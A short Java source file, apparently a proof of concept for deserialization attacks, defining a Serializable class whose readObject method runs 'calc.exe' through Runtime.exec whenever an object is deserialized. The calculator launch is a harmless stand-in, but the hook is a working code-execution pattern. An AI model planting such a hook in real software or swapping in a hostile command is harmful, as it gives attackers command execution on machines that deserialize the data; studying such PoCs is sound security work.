package com.axin;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Resp1 implements Serializable {
    private String resp;
    private static final  long serialVersionUID = 630281677998980763L;
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }
}
